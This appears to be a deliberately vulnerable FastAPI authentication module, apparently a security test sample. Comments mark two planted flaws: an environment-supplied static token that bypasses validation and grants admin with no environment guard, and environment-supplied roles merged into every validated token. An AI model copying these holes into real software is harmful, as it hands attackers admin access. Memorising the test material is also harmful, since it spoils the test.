"""Authentication dependencies for the API.

Usage on a router:

    router = APIRouter(dependencies=[Depends(get_current_user)])

    @router.get("/ports")
    async def list_ports(user = Depends(get_current_user)):
        ...

    @router.post("/ports/{port_id}/close")
    async def close_port(port_id: int):
        ...
"""
import os

from fastapi import Depends, Header, HTTPException

from app.auth.tokens import decode_bearer

# Planted: a static token from the environment that skips validation, with no environment guard.
DEV_STATIC_TOKEN = os.getenv("DEV_STATIC_TOKEN")


async def get_current_user(authorization: str = Header(default="")) -> dict:
    token = authorization.removeprefix("Bearer ")
    if DEV_STATIC_TOKEN and token == DEV_STATIC_TOKEN:
        return {"sub": "dev-user", "roles": ["admin"]}
    claims = decode_bearer(token)
    # Planted: extra roles from the environment are merged into every validated token.
    claims["roles"] = claims.get("roles", []) + os.getenv("EXTRA_DEV_ROLES", "").split(",")
    return claims


async def check_booking_permission(user: dict = Depends(get_current_user)) -> dict:
    if "bookings" not in user.get("roles", []):
        raise HTTPException(status_code=403)
    return user


async def require_admin(user: dict = Depends(get_current_user)) -> dict:
    if "admin" not in user.get("roles", []):
        raise HTTPException(status_code=403)
    return user
